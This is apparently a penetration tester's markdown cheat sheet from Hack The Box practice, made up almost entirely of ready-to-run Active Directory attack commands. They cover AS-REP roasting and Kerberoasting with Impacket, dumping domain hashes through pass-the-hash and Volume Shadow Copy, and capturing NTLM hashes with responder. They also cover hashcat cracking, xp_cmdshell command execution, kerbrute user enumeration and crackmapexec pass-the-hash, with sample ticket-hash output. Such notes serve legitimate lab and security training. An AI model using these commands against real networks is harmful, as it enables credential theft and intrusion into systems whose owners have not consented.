
## Impacket
## GetNPUsers
requiers user list, get hashes to asreproast
```
impacket-GetNPUsers '<domain.tld>' -usersfile <users.txt> -no-pass -dc-ip <IP ADDRESS> -format hashcat -outputfile hashes.asreproast
```

### Secretsdump

Attempt to dump credentials from a remote machine via Pass the Hash
```
	python secretsdump.py ./localadmin@computername.domain.com -hashes aad3b435b51404eeaad3b435b51404ee:21306681c738c3ed2d615e29be1574a3
```
Dump domain password hashes remotely via Volume Shadow Copy
```
	c:\users\username\appdata\local\temp\sd.exe domain/username:password@dchostname -just-dc -use-vss -outputfile
```

### GetUserSPNS.py

This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat
Source: https://room362.com/post/2016/kerberoast-pt2/
```
	root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin -dc-ip <target DC ip address>
	Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

	Password:
	ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
	----------------------------------  ----------  ----------------------------------------------------  -------------------
	http/win10.sittingduck.info         uberuser    CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
	MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20

	$krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
	$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
```
then in hashcat
```
hashcat -a 3 -m 13100 ~/Documents/htb/boxes/Active/ticket.txt /usr/share/wordlists/rockyou.txt --force
```

### SMBRelayx.py

https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&utm_source=Twitter&utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&utm_campaign=SANS+Pen+Test

### mssqlclient + responder
`mssqlclient.py DOMAIN/user:hash@10.10.10.10 -windows-auth`
when you run this, have **responder** running as well in another pane
then to crack the password you get..
`hashcat64.exe -a 0 -m 5600 htb-querier\ntlmv2.hashes ../rockyou.txt`
then in sql shell
`xp_cmdshell powershell -noexit "& ""c:\users\mssql-svc\downloads\try.ps1"""`


## Kerbrute
```
kerbrute userenum -d apt.htb --dc apt.htb users 
```
find a user?
```
cme smb apt.htb -u henry.vinson -H 2de80758521541d19cabba480b260e8f
```
